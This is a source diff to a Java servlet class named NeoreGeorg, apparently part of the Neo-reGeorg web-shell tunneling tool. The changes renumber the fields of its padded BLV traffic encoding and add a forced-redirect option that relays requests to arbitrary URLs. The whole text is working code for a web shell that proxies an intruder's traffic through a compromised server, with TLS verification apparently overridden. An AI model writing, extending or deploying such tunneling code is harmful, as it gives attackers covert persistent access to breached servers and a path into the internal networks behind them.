@@ -35,20 +35,21 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
             int MAXREADSIZE              = (Integer) args[6];
             String GeorgHello            = (String)  args[7];
 
-            int CMD         = 1;
-            int MARK        = 2;
-            int STATUS      = 3;
-            int ERROR       = 4;
-            int IP          = 5;
-            int PORT        = 6;
-            int REDIRECTURL = 7;
-            int DATA        = 8;
+            int DATA          = 1;
+            int CMD           = 2;
+            int MARK          = 3;
+            int STATUS        = 4;
+            int ERROR         = 5;
+            int IP            = 6;
+            int PORT          = 7;
+            int REDIRECTURL   = 8;
+            int FORCEREDIRECT = 9;
 
             ServletContext application = request.getSession().getServletContext();
             Writer out = response.getWriter();
 
-            Object[] info  = new Object[10];
-            Object[] rinfo = new Object[10];
+            Object[] info  = new Object[40];
+            Object[] rinfo = new Object[40];
             try {
                 if (request.getContentLength() != -1) {
                     String inputData = "";
@@ -75,8 +76,10 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
             String rUrl = (String) info[REDIRECTURL];
 
             if (rUrl != null) {
-                if (!islocal(rUrl)){
+                String force = (String) info[FORCEREDIRECT];
+                if (force.compareTo("TRUE") == 0 || !islocal(rUrl)){
                     info[REDIRECTURL] = null;
+                    info[FORCEREDIRECT] = null;
                     response.reset();
                     String method = request.getMethod();
                     URL u = new URL(rUrl);
@@ -350,7 +353,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
 
 
     public static Object[] blv_decode(byte[] data) {
-        Object[] info = new Object[10];
+        Object[] info = new Object[40];
 
         int i = 0;
         int data_len = data.length;
@@ -366,7 +369,8 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
             byte[] v = new byte[l];
             dataInput.read(v,0,v.length);
             i += ( 5 + l );
-            if ( b < 8 && b > 0 ) {
+            // 9 is BLVHEAD_LEN
+            if ( b > 1 && b <= 9 ) {
                 info[b] = new String(v);
             } else {
                 info[b] = v;
@@ -378,8 +382,8 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
 
 
     public static byte[] blv_encode(Object[] info) {
-        info[0] = randBytes(5, 20);
-        info[9] = randBytes(5, 20);
+        info[0]  = randBytes(5, 20);
+        info[39] = randBytes(5, 20);
         ByteArrayOutputStream buf = new ByteArrayOutputStream();
         for (int b = 0; b < info.length; b++) {
             if ( info[b] != null ) {
